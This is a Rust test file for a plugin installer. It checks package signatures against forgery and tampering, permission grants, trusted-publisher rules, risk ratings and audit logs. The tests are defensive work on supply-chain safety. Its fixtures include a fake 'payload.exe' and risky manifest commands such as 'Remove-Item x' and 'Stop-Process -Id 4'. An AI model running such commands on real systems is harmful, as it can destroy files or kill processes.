        let mut forged = tampered.clone();
        forged.push((SIG_PATH, sig_entry.clone()));
        let b = make_zip(&forged);
        assert!(verify_package(&mut archive_of(&b)).is_err());
        // 2) إضافة ملف بعد التوقيع
        let mut extra = files.clone();
        extra.push(("payload.exe", b"MZ".to_vec()));
        extra.push((SIG_PATH, sig_entry.clone()));
        assert!(verify_package(&mut archive_of(&make_zip(&extra))).is_err());
        // 3) توقيع من مفتاح آخر على المحتوى نفسه لكن بمفتاح عام مختلف ← لا يطابق
        let other = key(9);
        let mut sf: serde_json::Value = serde_json::from_slice(&sig_entry).unwrap();
        sf["publicKey"] = json!(B64.encode(other.verifying_key().to_bytes()));
        let mut swapped = files.clone();
        swapped.push((SIG_PATH, sf.to_string().into_bytes()));
        assert!(verify_package(&mut archive_of(&make_zip(&swapped))).is_err());
    }

    #[test]
    fn malformed_signature_files_are_rejected() {
        let m = manifest_value("hello", "1.0.0", &["process.run"], &["echo hi"])
            .to_string()
            .into_bytes();
        for bad in [
            b"not json".to_vec(),
            br#"{"version":2,"algorithm":"ed25519","publicKey":"AA==","signature":"AA=="}"#
                .to_vec(),
            br#"{"version":1,"algorithm":"rsa","publicKey":"AA==","signature":"AA=="}"#.to_vec(),
            br#"{"version":1,"algorithm":"ed25519","publicKey":"AA==","signature":"AA=="}"#
                .to_vec(),
        ] {
            let b = make_zip(&[("manifest.json", m.clone()), (SIG_PATH, bad)]);
            assert!(verify_package(&mut archive_of(&b)).is_err());
        }
    }

    /// اختبار تطابق: حزمة وقّعتها أداة Python (tools/sign_tarpkg.py) يجب أن يقبلها المتحقق في Rust.
    #[test]
    fn python_signed_package_verifies_in_rust() {
        let bytes = include_bytes!("../../examples/hello-signed.tarpkg");
        let sc = verify_package(&mut archive_of(bytes)).expect("python-signed package must verify");
        assert_eq!(sc.kind, "signed");
        assert_eq!(sc.key_id.as_deref(), Some(EXAMPLE_KEY_ID));
    }

    const EXAMPLE_KEY_ID: &str = "b600306cfa76723f";

    // ---------- التثبيت والصلاحيات وخطة التشغيل ----------

    #[test]
    fn install_rejects_undeclared_permissions_and_bad_signature() {
        let d = tmp();
        let db = db();
        let undecl = pkg(&manifest_value(
            "badtool",
            "1.0.0",
            &["process.run"],
            &["Remove-Item x"],
        ));
        let err = plugin::install_package(&db, &d, &undecl, APP).unwrap_err();
        assert!(err.contains("لم تعلنها"), "got: {err}");

        let sk = key(5);
        let files = vec![(
            "manifest.json",
            manifest_value("sigtool", "1.0.0", &["process.run"], &["echo hi"])
                .to_string()
                .into_bytes(),
        )];
        let good = sign_zip(&files, &sk, None);
        // نفس التوقيع على محتوى مختلف
        let sig_entry = read_entry(&mut archive_of(&good), SIG_PATH)
            .unwrap()
            .unwrap();
        let forged = make_zip(&[
            (
                "manifest.json",
                manifest_value("sigtool", "1.0.0", &["process.run"], &["echo evil"])
                    .to_string()
                    .into_bytes(),
            ),
            (SIG_PATH, sig_entry),
        ]);
        assert!(plugin::install_package(&db, &d, &forged, APP).is_err());
        assert!(plugin::list(&db).unwrap().is_empty());
        plugin::install_package(&db, &d, &good, APP).unwrap();
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn plan_run_requires_granted_permissions() {
        let d = tmp();
        let db = db();
        plugin::install_package(
            &db,
            &d,
            &pkg(&manifest_value(
                "hello",
                "1.0.0",
                &["process.run"],
                &["echo hi"],
            )),
            APP,
        )
        .unwrap();

        let err = plan_run(&db, &d, "hello", "go").unwrap_err();
        assert!(err.starts_with(PERM_TAG), "got: {err}");

        set_grants(&db, "hello", &["process.run".to_string()]).unwrap();
        let plan = plan_run(&db, &d, "hello", "go").unwrap();
        assert_eq!(plan.steps, vec!["echo hi".to_string()]);
        assert!(plan.needs_confirm, "unsigned local tool must be confirmed");
        assert_eq!(plan.signature, "unsigned");
        assert!(plan.cwd.is_some());

        plugin::set_enabled(&db, "hello", false).unwrap();
        assert!(plan_run(&db, &d, "hello", "go").is_err());
        plugin::set_enabled(&db, "hello", true).unwrap();
        assert!(plan_run(&db, &d, "hello", "nope").is_err());
        assert!(plan_run(&db, &d, "missing", "go").is_err());

        // ما رُفض سُجّل في التدقيق
        assert!(db
            .audit_recent(50)
            .unwrap()
            .iter()
            .any(|a| a.kind == "run_blocked"));
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn revoking_a_grant_blocks_again() {
        let d = tmp();
        let db = db();
        plugin::install_package(
            &db,
            &d,
            &pkg(&manifest_value(
                "hello",
                "1.0.0",
                &["process.run"],
                &["echo hi"],
            )),
            APP,
        )
        .unwrap();
        set_grants(&db, "hello", &["process.run".to_string()]).unwrap();
        assert!(plan_run(&db, &d, "hello", "go").is_ok());
        set_grants(&db, "hello", &[]).unwrap();
        assert!(plan_run(&db, &d, "hello", "go").is_err());
        let kinds: Vec<String> = db
            .audit_recent(50)
            .unwrap()
            .into_iter()
            .map(|a| a.kind)
            .collect();
        assert!(kinds.contains(&"grant".to_string()) && kinds.contains(&"revoke".to_string()));
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn set_grants_validation() {
        let d = tmp();
        let db = db();
        plugin::install_package(
            &db,
            &d,
            &pkg(&manifest_value(
                "hello",
                "1.0.0",
                &["process.run"],
                &["echo hi"],
            )),
            APP,
        )
        .unwrap();
        assert!(set_grants(&db, "hello", &["network".to_string()]).is_err());
        assert!(set_grants(&db, "nope", &[]).is_err());
        plugin::install_builtins(&db, APP).unwrap();
        assert!(set_grants(&db, "net", &[]).is_err());
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn trusted_signature_skips_confirm_but_not_for_high_risk() {
        let d = tmp();
        let db = db();
        let sk = key(11);
        trust_add(&db, "Pub", &B64.encode(sk.verifying_key().to_bytes())).unwrap();

        let calm = sign_zip(
            &[(
                "manifest.json",
                manifest_value("calm", "1.0.0", &["process.run"], &["echo hi"])
                    .to_string()
                    .into_bytes(),
            )],
            &sk,
            Some("Pub"),
        );
        plugin::install_package(&db, &d, &calm, APP).unwrap();
        set_grants(&db, "calm", &["process.run".to_string()]).unwrap();
        let p = plan_run(&db, &d, "calm", "go").unwrap();
        assert_eq!(p.signature, "trusted");
        assert!(!p.needs_confirm);

        let risky = sign_zip(
            &[(
                "manifest.json",
                manifest_value(
                    "risky",
                    "1.0.0",
                    &["process.run", "system.sensitive"],
                    &["Stop-Process -Id 4"],
                )
                .to_string()
                .into_bytes(),
            )],
            &sk,
            Some("Pub"),
        );
        plugin::install_package(&db, &d, &risky, APP).unwrap();
        set_grants(
            &db,
            "risky",
            &["process.run".to_string(), "system.sensitive".to_string()],
        )
        .unwrap();
        let p = plan_run(&db, &d, "risky", "go").unwrap();
        assert!(p.needs_confirm && !p.warnings.is_empty());
        assert_eq!(p.risk, "high");
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn builtin_runs_without_confirm() {
        let d = tmp();
        let db = db();
        plugin::install_builtins(&db, APP).unwrap();
        let p = plan_run(&db, &d, "net", "ping").unwrap();
        assert!(!p.needs_confirm);
        assert_eq!(p.signature, "builtin");
        assert!(p.cwd.is_none());
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn update_drops_grants_for_removed_permissions() {
        let d = tmp();
        let db = db();
        plugin::install_package(
            &db,
            &d,
            &pkg(&manifest_value(
                "hello",
                "1.0.0",
                &["process.run", "network"],
                &["ping 8.8.8.8"],
            )),
            APP,
        )
        .unwrap();
        set_grants(
            &db,
            "hello",
            &["process.run".to_string(), "network".to_string()],
        )
        .unwrap();
        plugin::install_package(
            &db,
            &d,
            &pkg(&manifest_value(
                "hello",
                "1.1.0",
                &["process.run"],
                &["echo hi"],
            )),
            APP,
        )
        .unwrap();
        assert_eq!(
            db.grants_get("hello").unwrap(),
            vec!["process.run".to_string()]
        );
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn trust_downgrade_produces_warning() {
        let d = tmp();
        let db = db();
        let sk = key(13);
        trust_add(&db, "Pub", &B64.encode(sk.verifying_key().to_bytes())).unwrap();
        let v1 = sign_zip(
            &[(
                "manifest.json",
                manifest_value("hello", "1.0.0", &["process.run"], &["echo hi"])
                    .to_string()
                    .into_bytes(),
            )],
            &sk,
            Some("Pub"),
        );
        plugin::install_package(&db, &d, &v1, APP).unwrap();
        let v2 = pkg(&manifest_value(
            "hello",
            "1.0.1",
            &["process.run"],
            &["echo hi"],
        ));
        let out = plugin::install_package(&db, &d, &v2, APP).unwrap();
        assert!(
            !out.warnings.is_empty(),
            "downgrade from trusted-signed to unsigned must warn"
        );
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn trust_add_validation() {
        let db = db();
        assert!(trust_add(&db, "", "AAAA").is_err());
        assert!(trust_add(&db, "x", "!!!not-base64").is_err());
        assert!(trust_add(&db, "x", &B64.encode([1u8; 16])).is_err());
        assert!(trust_add(&db, "x", &B64.encode(key(1).verifying_key().to_bytes())).is_ok());
        assert_eq!(db.trusted_list().unwrap().len(), 1);
        assert!(trust_remove(&db, "nonexistent").is_err());
    }

    #[test]
    fn rescan_updates_report_and_audit() {
        let d = tmp();
        let db = db();
        plugin::install_package(
            &db,
            &d,
            &pkg(&manifest_value(
                "hello",
                "1.0.0",
                &["process.run"],
                &["echo hi"],
            )),
            APP,
        )
        .unwrap();
        let r = rescan(&db, "hello").unwrap();
        assert_eq!(r.risk, "low");
        assert!(db
            .audit_recent(50)
            .unwrap()
            .iter()
            .any(|a| a.kind == "rescan"));
        let info = security_info(&db, "hello").unwrap();
        assert!(info.report.is_some());
        assert_eq!(info.signature.status, "unsigned");
        let _ = std::fs::remove_dir_all(&d);
    }
}
